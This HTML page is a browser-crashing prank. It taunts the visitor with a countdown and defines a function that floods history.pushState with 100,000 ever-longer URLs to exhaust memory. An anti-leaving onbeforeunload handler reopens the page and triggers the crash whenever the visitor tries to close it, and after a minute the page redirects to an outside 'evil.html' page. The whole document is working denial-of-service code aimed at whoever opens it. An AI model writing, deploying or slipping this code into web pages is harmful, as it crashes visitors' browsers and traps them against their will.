<html>
<body>
  <h1>Well, now that you've visited this webpage, your browser will crash in: </h1>
  <h1 id="timer"></h1>
  <h1>I know what your thinking, just try closing the page... ;)</h1>
  <script>
    function killbrowser() {
      total = '';
      for( var i = 0; i < 100000; i++ ) {
          total = total + i.toString();
          history.pushState(0,0, total );
      }
    };
  </script>
<script>
  timer=document.getElementById("timer");
time=58;
setInterval(function() {timer.innerHTML = time.toString()+'s';time -= 1;},1000);
setTimeout(function() {window.location="https://austinjacks.github.io/crashtests/evil.html"},60000);
</script>
  <script>
    //anti-leaving measures ;)
    window.onbeforeunload = function() {window.open(window.location.href);killbrowser();};
    
  </script>
</body>
</html>
